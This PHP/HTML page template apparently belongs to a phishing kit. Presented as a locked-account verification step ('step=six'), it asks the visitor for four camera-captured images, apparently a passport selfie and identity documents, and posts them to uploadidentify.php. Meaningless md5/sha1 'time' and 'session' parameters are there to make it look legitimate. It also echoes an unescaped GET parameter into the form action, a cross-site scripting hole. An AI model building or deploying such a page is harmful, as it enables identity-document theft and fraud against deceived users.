<?php
include('../pais/contenttrans.php');
?>
<label class="fieldLabel"><?= $j1 ?></label>
	<img style="HEIGHT:198px; WIDTH: 160px;" src="https://unichange.me/images/verification_docs/international_pass_selfie.png"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzPK0XhlbdMxqc_4sglHoLafNyZZ3tskuI11IMx5K0i8h4-xzT"><br>
	<form method="post" enctype="multipart/form-data" action="uploadidentify.php?locked=account_<?= $kode_negara ?>&login_params=checked&email_locked=<?= $_GET['email_locked'] ?>&step=six&time=<?= md5(gmdate('r')).sha1(gmdate('r')) ?>&session=<?php echo sha1(microtime()); ?>">
		<b><font color="Black">1. <?= $k1 ?></font></b>
		<input type="file" capture="camera" accept="image/*" name="attach[]"/><br/>
		<br>
		<b><font color="Black">2. <?= $l1 ?> </font></b>
		<input type="file" capture="camera" accept="image/*" name="attach[]"/><br/>
		<br>
		<b><font color="black">3. <?= $m1 ?></font></b>
		<input type="file" capture="camera" accept="image/*" name="attach[]"/><br/>
		<br>
		<b><font color="black">4. <?= $n1 ?></font></b>
		<input type="file" capture="camera" accept="image/*" name="attach[]"/><br/>
		<br>
		<br>
		<button style="align-items: right;" style="width: 100px !important;" type="submit" value="Submit" class="button"><?= $o1 ?></button>
</form>